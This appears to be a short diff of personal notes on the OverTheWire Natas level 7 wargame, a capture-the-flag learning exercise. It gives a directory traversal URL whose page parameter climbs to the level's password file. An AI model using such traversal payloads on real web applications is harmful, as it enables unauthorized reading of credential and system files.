@@ -1,0 +1,3 @@
+try for directory trivasl https://natas7.natas.labs.overthewire.org/index.php?page=home 
+eg: ttps://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8
+if this doesnt work they are sanitzing 
